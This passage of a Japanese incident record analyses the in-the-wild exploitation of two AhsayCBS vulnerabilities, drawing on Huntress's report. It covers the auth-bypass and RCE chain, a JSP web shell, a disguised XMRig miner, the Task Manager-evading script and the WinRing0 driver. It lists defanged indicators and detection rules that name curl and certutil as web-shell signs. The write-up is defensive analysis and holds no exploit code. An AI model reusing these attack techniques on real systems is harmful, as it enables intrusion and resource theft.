T1036.005（正規の資源名または場所との一致）の行</div></li><li><div class=stg><span class="b stage">5. 検知回避</span><span class="b conf">disclosed</span><span class=srcs>[1]</span></div><div>**`Taskgmr.ps1` は、採掘を利用者の目から隠すために書かれている。** Huntress は、註釈されたコードから**AI の助けを借りて書かれたとみられる**と述べている。 動作は次のとおり—— **①タスクマネージャーが起動しているかを継続的に調べ、 開かれていれば `MicrosoftEdgeUpdateSvc` を停止して採掘の活動を隠す。 閉じられると再び動かす。 ②特定の時刻（18:00）にタスクマネージャーを終了させ、 夜間の時間帯に1時間以上開かれたままだった場合にも終了させる。** **時刻の判定には UTC ではなく端末のローカル時刻（`Get-Date`）が使われている。** また、一部の事案では**脆弱な正規カーネルドライバ `WinRing0x64.sys`**が `certutil.exe` で一時フォルダへ落とされた。 これは OpenLibSys の WinRing0 ライブラリの一部で、 ハードウェアへの低レベルの到達を与える。 **脆弱なドライバは通常エンドポイントの防御を無効化するために持ち込まれるが、 本件では用途が違う**——Huntress は 「このドライバを読み込むことで、攻撃者は採掘機が 基盤のハードウェアへカーネル水準で到達できるようにし、 可能なかぎり広い制御と性能で採掘を支えた」と評価している（原文英語）</div><div class=fn>根拠: Huntress の報告の「PS1 Script/Task Manager」および 「Vulnerable Kernel Driver」の節、 ATT&amp;CK 対応表の T1564（成果物の隠蔽）・T1057（プロセスの探索）・ T1124（システム時刻の探索）の行</div></li><li><div class=stg><span class="b stage">6. 影響（暗号化・破壊・改ざん）</span><span class="b conf">disclosed</span><span class=srcs>[1]</span></div><div>**XMRig（Monero の採掘機）が投入され、資源の横取りが行われた。** 採掘機（`edge.exe`）は Microsoft Edge のプロセスに見せかけて 一時フォルダに置かれ、**ポート 8029 で Monero のプール （`51.195.127[.]124:8029`・`xmr.kryptex[.]network`）へ接続した。** **ランサムウェアや情報の持ち出しが行われたという記述は無い**（本記録の確認）。 ただし Huntress は 「IoC が見つかった場合は、信頼できるバックアップからホストを完全に再構築すべきである。 攻撃者は長期の常駐のために二次的な裏口を隠せている」と述べている（原文英語）—— **採掘だけで終わったとは言えない、という警告である**（本記録の読み）</div><div class=fn>根拠: Huntress の報告の「Cryptominers」の節と IoC 表、 ATT&amp;CK 対応表の T1496.001（資源の横取り: 計算資源の横取り）・ T1571（非標準ポート）の行</div></li></ol></div>
+<section id="s5"><h2>修正版が手元に無い状態で、認証回避とRCEの連鎖が実地で使われている<span class="b slot">概観</span></h2><p><strong>公表された事実</strong></p>
+<table>
+<thead>
+<tr>
+<th>項目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>製品</td>
+<td><strong>AhsayCBS</strong>（Cloud Backup Server）— Ahsay のバックアップソフトウェアの管理コンソール。<strong>主に MSP とシステムインテグレータが使う</strong></td>
+</tr>
+<tr>
+<td>脆弱性①</td>
+<td><strong>CVE-2026-105133</strong>（中程度）<code>filecom/ahsay/obs/api/ApiStructsAction.java</code> の <code>checkSysPwd</code> 関数の<strong>認証の不備</strong>（CWE-287／CVSS v3.1 <strong>7.3</strong>）</td>
+</tr>
+<tr>
+<td>脆弱性②</td>
+<td><strong>CVE-2026-105134</strong>（致命的）Replication Receiver の <code>/rps/api/json/UpdateReceivers.do</code>。<strong>未認証のリモートコード実行</strong>で <strong>NT AUTHORITY\SYSTEM</strong> を取れる（CWE-77／CVSS v3.1 <strong>10.0</strong>）</td>
+</tr>
+<tr>
+<td>特定</td>
+<td><strong>2026年10月4日</strong></td>
+</tr>
+<tr>
+<td>実地の悪用の観測</td>
+<td><strong>2026年10月7日 23:20:15 UTC</strong>（Huntress）</td>
+</tr>
+<tr>
+<td>公開</td>
+<td><strong>2026年10月8日 20:00 UTC</strong>（Huntress の分析）</td>
+</tr>
+<tr>
+<td><strong>訂正</strong></td>
+<td><strong>2026年10月8日 18:00 米国東部時間 — 「Ahsay 10.3.4 も影響を受ける」</strong></td>
+</tr>
+<tr>
+<td>影響する版</td>
+<td><strong>Huntress: 10.3.4 までの版</strong>／<strong>CVE の記載: 10.3.2 以前（解決策は 10.3.4 へのアップグレード）</strong></td>
+</tr>
+<tr>
+<td>緩和策</td>
+<td><strong>管理用インターフェースへのアクセスを信頼できる IP か VPN に限る</strong>／痕跡があれば<strong>信頼できるバックアップから完全に再構築</strong></td>
+</tr>
+<tr>
+<td>検知</td>
+<td>Huntress が<strong>Sigma ルール4本</strong>を公開（<code>2026/2026-10/AhsayCBS_XMRig_Miner</code>）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>本記録が最初に指摘するのは、順序である。</strong></p>
+<p>脆弱性の特定が10月4日。<strong>実地での悪用の観測が10月7日。</strong> 3日である。そして<strong>10月8日の時点で、利用者が適用できる修正は無い。</strong></p>
+<p>Huntress の訂正はこう書かれている（原文英語）。</p>
+<blockquote>
+<p>追加の調査により、Ahsay 10.3.4 も影響を受けると判断した。以前の報告では 10.3.4 は影響を受けないとしていたが、調査結果を反映して改めた。Ahsay にも連絡し、調査の詳細を共有した。<strong>修正が入手できるようになるまでは</strong>、管理用インターフェースへのアクセスを制限し、侵害の痕跡を調査することを推奨する。</p>
+</blockquote>
+<p>一方、<strong>CVE の記載（VulDB・INCIBE-CERT）は「10.3.4 へ上げれば直る」としている。</strong></p>
+<p><strong>同じ日に両方を見ると、運用の判断が逆になる</strong>（本記録の指摘）。本記録は Huntress の記述を採る——悪用を観測している当事者の、より新しく、より安全側の判断だからである。</p></section>
+<section id="s6"><h2>侵害後は採掘だが、正規のものを並べて組み立てている<span class="b slot">原因・手口</span></h2><p><strong>公表された事実</strong>（Huntress が観測した侵害後の挙動）</p>
+<table>
+<thead>
+<tr>
+<th>段階</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>足場</td>
+<td>悪性の <strong>replication receiver</strong> を設定し、CBS アプリが配信するディレクトリへ <strong>JSP のウェブシェル</strong>を設置</td>
+</tr>
+<tr>
+<td>配送</td>
+<td><code>cbssvcX64.exe</code> の子プロセスが <strong>Alibaba Cloud のオブジェクトストレージ</strong>（<code>imagefiles-backup.oss-ap-southeast-7.aliyuncs[.]com</code>）から <code>Taskgmr.ps1</code>・<code>msedge.exe</code>・<code>edge.exe</code>・<code>config.json</code> を一時フォルダへ取得（<strong>curl</strong>）</td>
+</tr>
+<tr>
+<td>採掘機</td>
+<td><strong><code>edge.exe</code> は XMRig</strong>（Monero の採掘機）。Microsoft Edge のプロセスに見せかけ、<strong>ポート 8029</strong> で <code>51.195.127[.]124:8029</code>・<code>xmr.kryptex[.]network</code> へ接続</td>
+</tr>
+<tr>
+<td>常駐</td>
+<td><strong><code>msedge.exe</code> は正規ユーティリティ NSSM の改変版</strong>。<strong><code>MicrosoftEdgeUpdateSvc</code></strong>（本物の <code>edgeupdate</code> に似せた名前）という Windows サービスを作り、<strong>SYSTEM 権限</strong>で動かす</td>
+</tr>
+<tr>
+<td>隠蔽</td>
+<td><strong><code>Taskgmr.ps1</code></strong> が<strong>タスクマネージャーの起動を監視</strong>し、開かれていればサービスを停止、閉じられたら再開。<strong>18:00 に終了させ、夜間に1時間以上開かれていた場合にも終了させる</strong>（判定は<strong>ローカル時刻</strong>）</td>
+</tr>
+<tr>
+<td>ドライバ</td>
+<td>一部の事案で <strong><code>certutil.exe</code></strong> により <strong><code>WinRing0x64.sys</code></strong>（正規だが脆弱なカーネルドライバ）を持ち込み、採掘機に<strong>ハードウェアへのカーネル水準の到達</strong>を与えた</td>
+</tr>
+</tbody>
+</table>
+<p>Huntress は <code>Taskgmr.ps1</code> について、<strong>註釈されたコードから AI の助けを借りて書かれたとみられる</strong>と述べている。</p>
+<p><strong>本記録の読み</strong> — 使われているものを並べると、特徴が見える。</p>
+<blockquote>
+<p>curl、certutil、NSSM、WinRing0、Alibaba Cloud、Microsoft Edge という名前</p>
+</blockquote>
+<p><strong>すべて正規のものか、正規を装ったものである。</strong>単体で「悪性」と判定しにくいものを並べて、<strong>全体として悪性の挙動</strong>を作っている（本記録の評価）。</p>
+<p>だから検知は<strong>単体の評判ではなく、組み合わせと文脈</strong>で行う必要がある—— Huntress の Sigma ルール4本はまさにそう書かれている。3本目は「タスクマネージャーの有無を調べてサービスを止めたり動かしたりするスクリプトブロック」を照合し、<strong>サービス名ではなくその組み合わせで判定するため、改名では回避できない</strong>（原文英語）。</p>
+<p><strong>隠蔽の仕掛けについて1つ</strong>（本記録の評価）。</p>
+<p>タスクマネージャーを見張る仕組みは、<strong>自動の検知ではなく人の目を相手にしている。</strong> <strong>つまり攻撃者は「利用者が気づく水準の負荷である」と認識していた。</strong>逆に言えば、<strong>利用者の体感（重い・タスクマネージャーが勝手に閉じる）は有効な申告の経路である。</strong></p></section>
+<section id="s7"><h2>侵害されたのは、復旧の最後の拠り所である<span class="b slot">業務・事業への影響</span></h2><p><strong>公表された事実</strong></p>
+<p>AhsayCBS は Huntress の説明によれば「Ahsay のバックアップソフトウェアの管理コンソールであり、<strong>主に MSP（マネージドサービス事業者）とシステムインテグレータが使う。</strong>バックアップの運用を集中管理し、管理者が利用者を作成し、バックアップの方針を設定することなどを可能にする」（原文英語）。</p>
+<p>Huntress の緩和策の勧告はこう書かれている（原文英語）。</p>
+<blockquote>
+<p>IoC がいずれか発見された場合、企業は<strong>信頼できるバックアップからホストの完全な再構築</strong>を行うべきである。攻撃者は長期の常駐のために二次的な裏口を隠せている。</p>
+</blockquote>
+<p><strong>本記録の評価</strong> — この勧告は、本件では重い。</p>
+<p><strong>「信頼できるバックアップから戻せ」という指示の対象が、バックアップの管理基盤そのものである。</strong></p>
+<p>バックアップの管理コンソールを SYSTEM 権限で握られたということは、次の3つが同時に疑わしくなる（本記録の判断。<strong>Huntress はここまで書いていない</strong>）。</p>
+<ol>
+<li><strong>バックアップの方針</strong>——取得の対象・頻度・保持期間を変えられたか</li>
+<li><strong>保管されたデータ</strong>——参照・持ち出し・改変・削除が行われたか</li>
+<li><strong>復旧の可能性</strong>——戻す先が信頼できるか</li>
+</ol>
+<p><strong>Huntress の報告には、バックアップのデータ自体が触られたかどうかの記述が無い</strong>（本記録の確認。unknowns に残した）。<strong>読者が最も知りたい点が空いている。</strong></p>
+<p><strong>日本の CISO への含意</strong>（本記録の判断）。ランサムウェアへの備えとして「バックアップがあるから戻せる」と整理している組織は多い。本件はその前提の脆さを示している—— <strong>バックアップの管理基盤が侵害されうるなら、「管理基盤が信用できない場合の復旧手順」が別に要る。</strong>演習に1回入れておくだけで、持っているかどうかが分かる。</p></section>
+<section id="s8"><h2>検知の勘所は「サービスの子プロセス」と「一時フォルダから常駐するサービス」である<span class="b slot">対策・注意喚起</span></h2><p><strong>公表された事実</strong>（Huntress が公開した Sigma ルール4本。いずれも侵害後の検知）</p>
+<table>
+<thead>
+<tr>
+<th>ルール</th>
+<th>内容</th>
+<th>設計の理由（Huntress の説明・原文英語）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><strong>AhsayCBS サービスからの予期しない子プロセス</strong>（<code>cbssvcX64.exe</code>／<code>cbssvcX86.exe</code> が、通常の起動・保守のコマンド以外のプロセスを生むこと）</td>
+<td>「AhsayCBS は Web アプリをサービスのプロセス内で動かすため、設置された JSP のウェブシェルからのコマンドは<strong>サービスの直接の子プロセスとして現れる</strong>」</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>Edge を名乗る実行ファイルが daemonize の指定付きで起動</strong>（元のファイル名が <code>msedge_exe</code>、または <code>--daemonized</code> 付き）</td>
+<td>「ここでは改名された NSSM と XMRig の採掘機が Microsoft Edge を装っていた」</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>PowerShell のスクリプトブロック: タスクマネージャーを意識したサービスの制御</strong></td>
+<td>「<code>Taskgmr.ps1</code> が採掘機を利用者から隠す方法である。<strong>サービス名ではなくその組み合わせで照合するため、サービスを改名しても回避できない</strong>」</td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>コマンド行による WinRing0 ドライバの取得</strong>（<code>WinRing0</code> の名前と URL が同じコマンド行に現れる）</td>
+<td>「採掘機の投入役はこの方法で脆弱なドライバを取りに行くが、<strong>正規のハードウェア監視ツールはインストーラの中に同梱して配る</strong>」</td>
+</tr>
+</tbody>
+</table>
+<p>Huntress は「<strong>どれか1本で鳴れば、防御側は連鎖を断つ機会を得る</strong>」と述べている。</p>
+<p><strong>本記録の評価</strong> — 4本の設計には、製品に依存しない考え方が入っている。</p>
+<p><strong>①「このプロセスは普段どんな子プロセスを作るか」を知っていること</strong>（ルール1）。これは AhsayCBS に限らない。自社の公開サービスについて、<strong>平常時の子プロセスの一覧を実測で作れる</strong>（本記録の判断）。</p>
+<p><strong>②名前ではなく属性と置き場所で見ること</strong>（ルール2・3）。本件のサービス名は本物に似せてある。<strong>改名で回避されない判定軸</strong>——元のファイル名、起動の引数、実行ファイルの置き場所（一時フォルダ）——を使う。</p>
+<p><strong>③「正規だが配り方が異常」を見ること</strong>（ルール4）。WinRing0 は正規のドライバである。<strong>異常なのはドライバではなく、コマンド行で取りに行く形である。</strong></p>
+<p><strong>本記録が足す対策</strong>（ここからは本記録の判断である）。</p>
+<ul>
+<li><strong>Windows の脆弱ドライバ遮断リスト（HVCI／WDAC）を有効にする</strong>——署名が有効な脆弱ドライバは署名の検査では止まらない</li>
+<li><strong>一時フォルダにある実行ファイルを指すサービスの作成を遮断する</strong>——置き場所だけで判定でき、名前の偽装に強い</li>
+<li><strong>サーバからの出口の通信を既定で拒否する</strong>——配送（平文 HTTP）も採掘（ポート 8029）も外向きの通信を通る</li>
+</ul></section>
+<section id="s9"><h2>版と修正をめぐる食い違いが、そのまま運用の判断を分ける<span class="b slot">未確定事項</span></h2><p><strong>公表された事実</strong></p>
+<table>
+<thead>
+<tr>
+<th>出所</th>
+<th>影響する版</th>
+<th>解決策</th>
+<th>日付</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Huntress</strong></td>
+<td><strong>10.3.4 までの版</strong>（当初は 10.3.4 を除外していたが訂正）</td>
+<td><strong>修正は無い。</strong> 管理用インターフェースへの到達を制限し、侵害の痕跡を調査する</td>
+<td>2026年10月8日（訂正は同日18:00 米国東部時間）</td>
+</tr>
+<tr>
+<td><strong>VulDB／INCIBE-CERT</strong></td>
+<td><strong>10.3.2 以前</strong></td>
+<td><strong>10.3.4 へのアップグレード</strong>（参照先に Ahsay の v10.3.4 のリリースノート）</td>
+<td>公開2026年10月4日・最終更新10月6日</td>
+</tr>
+<tr>
+<td><strong>Ahsay（開発元）</strong></td>
+<td>—</td>
+<td>—</td>
+<td><strong>advisory ページに本件の告知を確認できず</strong>（2026年10月9日・本記録の確認。掲載は2019年4月24日の v7・v8 の1件のみ）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>10.3.3 については、どちらも明示していない。</strong></p>
+<p><strong>本記録の判断</strong> — Huntress の記述を採る。</p>
+<p>理由は3点である。①<strong>実地の悪用を観測している当事者の記述である</strong>、②<strong>より新しい</strong>（10月8日の訂正）、③<strong>より安全側である</strong>（誤っていた場合の損失が小さい）。</p>
+<p><strong>ただし、供給元 Ahsay 自身が影響範囲をどう認定しているかを本記録は確認できていない。</strong> <strong>これが本件の最大の空白である</strong>（本記録の評価）—— <strong>利用者は「いつ直るのか」を供給元から知る手立てが無い。</strong></p>
+<p><strong>実務の読み替え</strong>（本記録の判断）。</p>
+<p>AhsayCBS を運用しているなら、版の確認と並行して<strong>到達の制限を先に実施する。</strong>「10.3.4 に上げたから安全」という整理は、Huntress の訂正により成立しない。そして<strong>痕跡の調査を、上げた後でも実施する</strong>——悪用の観測は10月7日からであり、<strong>上げる前に入られている可能性がある。</strong></p></section>
+<section id="s10"><h2>製品名を外して読むと、この事案は3つの点検項目になる<span class="b slot">評価・解釈</span></h2><p><strong>本記録の評価</strong>（ここから先は公表資料ではなく本記録の判断である）</p>
+<p>AhsayCBS を使っていない組織にとっても、本件は点検の材料になる。<strong>製品名に依存しない要素を3つに絞る。</strong></p>
+<p><strong>1. 管理基盤は、インターネットから到達できるか。</strong></p>
+<p>本件の入口は<strong>露出した管理用インターフェース</strong>である。Huntress の緩和策は「信頼できる IP か VPN に限れ」—— <strong>修正版が無い状態では、これが唯一の予防である。</strong></p>
+<p>自社のバックアップ・監視・運用の管理コンソールについて、<strong>インターネットから直接到達できるものを一覧にする。</strong>委託先が運用しているものも含める（本件の主な利用者は MSP である）。</p>
+<p><strong>2. 公開サービスのプロセスは、普段どんな子プロセスを作るか。</strong></p>
+<p>Huntress が最初に気づいたのはここである。<strong>ウェブシェルからのコマンドは、サービスの直接の子プロセスとして現れる。</strong></p>
+<p>これは実測で作れる——平常時の1〜2週間の記録から「このサービスが作る子プロセスの一覧」を作り、それ以外を検知する。<strong>とくに <code>cmd.exe</code>・<code>powershell.exe</code>・<code>curl</code>・<code>certutil</code> がサービスの子として現れる形は、ウェブシェルの典型である。</strong></p>
+<p><strong>3. 正規に署名された脆弱なドライバを、読み込ませない設定になっているか。</strong></p>
+<p><code>WinRing0x64.sys</code> は<strong>正規のドライバ</strong>である。<strong>署名の検査では止まらない。</strong> Windows の脆弱ドライバ遮断リスト（HVCI／WDAC）を有効にするかどうかの一択であり、<strong>本件に限らず繰り返し使われている手である</strong>（Huntress も「他の無関係な攻撃でも以前に公表されている」と述べている）。</p>
+<p><strong>最後に、この事案の「軽さ」について</strong>（本記録の評価）。</p>
+<p>実被害は<strong>計算資源の横取り</strong>である。採掘で終わっている。しかし<strong>入口は未認証で SYSTEM 権限のコード実行</strong>であり、<strong>同じ入口でランサムウェアも情報の持ち出しも成立する。</strong></p>
+<p>攻撃者は JSP のウェブシェル、改変した NSSM による常駐、AI の助けを借りたとみられる隠蔽スクリプト、脆弱なドライバの持ち込みまで組み立てている——<strong>採掘は目的だが、能力はそれ以上である。</strong></p>
+<p><strong>脆弱性の優先度は「観測されている悪用の目的」ではなく「取られる権限」で決めるべきである</strong>（本記録の判断）。</p></section>
+<div class="blk " id="s11"><h3>経過</h3><div class=twrap><table class=g><tbody><tr><td class="sm nowrap tw">2026年10月4日</td><td class=nowrap><span class="b kind">報道・レポート公開</span></td><td>**AhsayCBS に2つの脆弱性が特定された。** CVE-2026-105133（`checkSysPwd` 関数の認証の不備・CWE-287）と CVE-2026-105134（Replication Receiver の `/rps/api/json/UpdateReceivers.do` に 対する未認証のリモートコード実行・CWE-77）。 CVE の記載の公開日も同日である（VulDB／INCIBE-CERT）</td></tr><tr><td class="sm nowrap tw">2026年10月6日</td><td class=nowrap><span class="b kind">注意喚起</span></td><td>CVE の記載が最終更新された（VulDB／INCIBE-CERT）。 **この時点の記載は、影響を「10.3.2 以前」、解決策を「10.3.4 へのアップグレード」としている**</td></tr><tr><td class="sm nowrap tw">2026年10月7日 23:20:15 UTC</td><td class=nowrap><span class="b kind">検知</span></td><td>**Huntress が実地での悪用の観測を開始。** 露出していたシステムで**未認証のリモートコード実行**が行われ、 **ウェブシェルが設置**された。 最初に把握されたのは、AhsayCBS のサービス実行ファイル（`cbssvcX64.exe`）から 生まれた不審なコマンド行である</td></tr><tr><td class="sm nowrap tw">2026年10月8日 20:00 UTC</td><td class=nowrap><span class="b kind">調査報告書の公表</span></td><td>**Huntress が分析を公開**（本記録の起点）。 2つの脆弱性の連鎖、JSP ウェブシェルの設置、 Alibaba Cloud のオブジェクトストレージからの `Taskgmr.ps1`・`msedge.exe`・ `edge.exe`・`config.json` の投入、 XMRig による採掘（ポート 8029・`xmr.kryptex[.]network`）、 `MicrosoftEdgeUpdateSvc` による常駐、 改変された NSSM、`WinRing0x64.sys` の持ち込み、 IoC と ATT&amp;CK の対応、**Sigma ルール4本**の公開を示した</td></tr><tr><td class="sm nowrap tw">2026年10月8日 18:00 米国東部時間</td><td class=nowrap><span class="b kind">訂正</span></td><td>**Huntress が訂正を追記。** 「追加の調査により、Ahsay 10.3.4 も影響を受けると判断した。 以前の報告では 10.3.4 は影響を受けないとしていたが、 調査結果を反映して改めた」とし、 **Ahsay に連絡して調査の詳細を共有したこと**、 **修正が入手できるようになるまでは管理用インターフェースへの アクセスを制限し侵害の痕跡を調査することを推奨すること**を述べた（原文英語）</td></tr><tr><td class="sm nowrap tw">2026年10月9日（本記録の確認時点）</td><td class=nowrap><span class="b kind">本記録の作成者による観測（現況確認）</span></td><td>**本記録の作成者が Ahsay の security advisory のページを確認した観測。** 掲載されていたのは**2019年4月24日の「Critical Vulnerabilities on v7 and v8」1件のみ**で、 本件に関する告知は無かった。 **供給元の公式の声明・修正版の提供時期はいずれも確認できていない**</td></tr></tbody></table></div></div>
+<div id="s12"><div class="box disc"><div class=bt>資料間の食い違い・留保<span class=bc>5</span></div><ul><li><span class="b dk">発表・報道間の食い違い</span><span class=ui>影響を受ける版と修正の有無（10.3.4）</span><div class=sm>**これが本件で最も運用に響く食い違いである**（本記録の評価）。 **Huntress（2026年10月8日 18時 米国東部時間の更新）**—— 「追加の調査により、Ahsay 10.3.4 も影響を受けると判断した。 以前の報告では 10.3.4 は影響を受けないとしていたが、調査結果を反映して改めた。 Ahsay にも連絡し、調査の詳細を共有した。 **修正が入手できるようになるまでは**、管理用インターフェースへのアクセスを制限し、 侵害の痕跡を調査することを推奨する」（原文英語）。 本文でも「AhsayCBS versions through 10.3.4 are impacted」と明記している。 **VulDB／INCIBE-CERT（公開2026年10月4日・最終更新10月6日）**—— 影響は「AhsayCBS 10.3.2 以前」、解決策は「**10.3.4 へのアップグレード**」。 参照先には Ahsay の v10.3.4 のリリースノートが挙げられている。 **つまり、CVE の記載に従えば「10.3.4 に上げれば直る」、 Huntress に従えば「10.3.4 でも危ないので到達を制限せよ」になる。** **本記録は Huntress の記述を採る。** 理由は3点（本記録の判断）—— ①**実地の悪用を観測している当事者の記述である**、 ②**より新しい**（10月8日の訂正）、 ③**より安全側の判断である**（誤っていた場合の損失が小さい）。 **ただし供給元 Ahsay 自身の認定を本記録は確認できていない**</div></li><li><span class="b dk">発表・報道間の食い違い</span><span class=ui>CVE-2026-105134 の性質（認証の回避か、コマンドインジェクションか）</span><div class=sm>**Huntress** は CVE-2026-105134 を 「Replication Receiver の `/rps/api/json/UpdateReceivers.do` に影響する 致命的な脆弱性で、ホスト上で NT AUTHORITY/SYSTEM として 未認証のリモートコード実行を達成できる。 **この API には認証の回避があり、無作為のトークンが 正当な資格情報の代わりになりうる**」と説明している（原文英語）。 **VulDB／INCIBE-CERT** は同じ CVE を **「`random` 引数の操作による OS コマンドインジェクション」**とし、 CWE-77（コマンドインジェクション）を割り当てている。 **矛盾とは言い切れない**（本記録の読み）—— `random` という引数名は Huntress の言う「無作為のトークン」と対応しており、 **同じ引数が認証の回避とコマンドの注入の両方に関わっている可能性がある。** **ただし、どちらの説明が実装の正確な像かは本記録には判定できない。** なお Huntress は CVE-2026-105133 を認証の回避の段として位置づけており、 **2つの CVE の役割分担についても記述に重なりがある**（本記録の指摘）</div></li><li><span class="b dk">当事者の公表なし</span><span class=ui>Ahsay の公式の告知が確認できないこと</span><div class=sm>**本記録の作成者が2026年10月9日に Ahsay の security advisory のページを確認したところ、 掲載されていたのは2019年4月24日の「Critical Vulnerabilities on v7 and v8」1件のみで、 CVE-2026-105133／CVE-2026-105134 に関する告知は無かった。** Huntress は「Ahsay にも連絡し、調査の詳細を共有した」と述べているが、 **供給元の側の反応・影響範囲の認定・修正版の提供時期はいずれも確認できていない。** **CVE の記載が参照先として v10.3.4 のリリースノートを挙げていることから、 リリースノートには何らかの記述がある可能性があるが、 本記録はその内容を確認していない**（本記録の限界）。 **これは本件の最大の空白である**（本記録の評価）—— **利用者は「いつ直るのか」を供給元から知る手立てが無い**</div></li><li><span class="b dk">裏取りできていない</span><span class=ui>本記録は日本国内の利用・被害を確認できていない</span><div class=sm>**AhsayCBS を日本の MSP・システムインテグレータが運用しているか、 本件で影響を受けたかを本記録の作成者は裏取りできていない。** Huntress の報告にも CVE の記載にも国別の情報は無い。 **本記録が日本との関わりを「有名事象としての記録」に分類したのは 「関係が薄い」と判定したからではなく、「確認できていない」からである** （本記録の明示）。 **構図（露出した管理基盤・サービスの子プロセスの未監視・ 脆弱な正規ドライバの持ち込み）は製品名に依存せず、 日本の読者にそのまま当てはまる**（本記録の判断）</div></li><li><span class="b dk">裏取りできていない</span><span class=ui>本記録は IoC のハッシュ値を転記していない</span><div class=sm>**Huntress は IoC の表に SHA256 のハッシュ値3件 （改変された NSSM、採掘機、PowerShell スクリプト）を掲載しているが、 本記録が読んだ保存分の本文では表の値が欠落していた**（表の構造だけが残り、 値が抽出できていない）。 **本記録はハッシュ値を推測で補わない。** **照合に使う場合は Huntress の原文を参照すること**（出典1）。 なお、本文中に平文で記載されていた指標 （`imagefiles-backup.oss-ap-southeast-7.aliyuncs[.]com`、 `51.195.127[.]124:8029`、`xmr.kryptex[.]network`、 ファイル名 `Taskgmr.ps1`・`msedge.exe`・`edge.exe`・`config.json`・`WinRing0x64.sys`、 サービス名 `MicrosoftEdgeUpdateSvc`）は本記録に収めた。 **また本DBの方針として、抽出した指標は悪性の検証を行っていない**</div></li></ul></div></div>
+<div class="part p2" id="part2"><div class="ph"><span class="pn">Part 2</span>ここから学べること</div><div class="pd">上の事実をもとにした本記録の評価・示唆です。<b>当事者が述べたことではありません。</b>読者は日本の CISO・セキュリティ技術者を想定しています。</div></div>
+<div class="blk " id="s13"><h3>波及の構造</h3><div class="blknote">事案の構造を図にしたものです。数値は公表値に基づきます。</div><div class=dia><div class=diat>認証回避とRCEの連鎖 → JSPウェブシェル → Alibaba Cloud から採掘機と改変NSSM → Edgeを装うSYSTEMサービスで常駐</div><div class=svgwrap><svg viewBox="0 0 1202 432" width="100%" preserveAspectRatio="xMidYMid meet" role="img"><path d="M166,216.0 C193.0,216.0 193.0,114.0 220,114.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M370,114.0 C295.0,114.0 295.0,204.0 220,204.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M370,204.0 C295.0,204.0 295.0,306.0 220,306.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M370,306.0 C397.0,306.0 397.0,165.0 424,165.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M574,165.0 C499.0,165.0 499.0,255.0 424,255.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M574,255.0 C601.0,255.0 601.0,165.0 628,165.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M778,165.0 C703.0,165.0 703.0,267.0 628,267.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M778,267.0 C805.0,267.0 805.0,120.0 832,120.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M982,120.0 C1009.0,120.0 1009.0,48.0 1036,48.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M778,267.0 C805.0,267.0 805.0,210.0 832,210.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M982,210.0 C907.0,210.0 907.0,120.0 832,120.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M778,267.0 C805.0,267.0 805.0,306.0 832,306.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M982,306.0 C1009.0,306.0 1009.0,48.0 1036,48.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M370,306.0 C703.0,306.0 703.0,138.0 1036,138.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M1186,138.0 C1111.0,138.0 1111.0,228.0 1036,228.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M1186,306.0 C703.0,306.0 703.0,306.0 220,306.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><path d="M1186,306.0 C1111.0,306.0 1111.0,384.0 1036,384.0" fill="none" stroke="#2e3250" stroke-width="1.4"/><rect x="16" y="184.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="91.0" y="206.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">攻撃者（帰属への言及は無</text><text x="91.0" y="220.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">い／採掘を目的とする金銭</text><text x="91.0" y="234.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">動機とみられる）</text><rect x="220" y="82.0" width="150" height="64" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="295.0" y="104.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">CVE-2026-105</text><text x="295.0" y="118.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">133：checkSys</text><text x="295.0" y="132.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">Pwd の認証の不備（…</text><rect x="220" y="160.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#f48fb1" stroke-width="1.4"/><text x="295.0" y="182.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">CVE-2026-105</text><text x="295.0" y="196.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">134：/rps/api</text><text x="295.0" y="210.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">/json/Updat…</text><text x="295.0" y="223.0" text-anchor="middle" fill="#f48fb1" font-size="10">SYSTEM 権限で実行</text><text x="295.0" y="235.0" text-anchor="middle" fill="#f48fb1" font-size="10">／10.3.4 も影響（</text><rect x="220" y="262.0" width="150" height="88" rx="6" fill="#1a1d27" stroke="#64b5f6" stroke-width="1.4"/><text x="295.0" y="284.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">インターネットに露出した</text><text x="295.0" y="298.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5"> AhsayCBS 管理</text><text x="295.0" y="312.0" text-anchor="middle" fill="#e2e8f0" font-size="11.5">用インターフェース（c…</text><text x="295.0" y="325.0" text-anchor="middle" fill="#64b5f6" font-size="10">主に 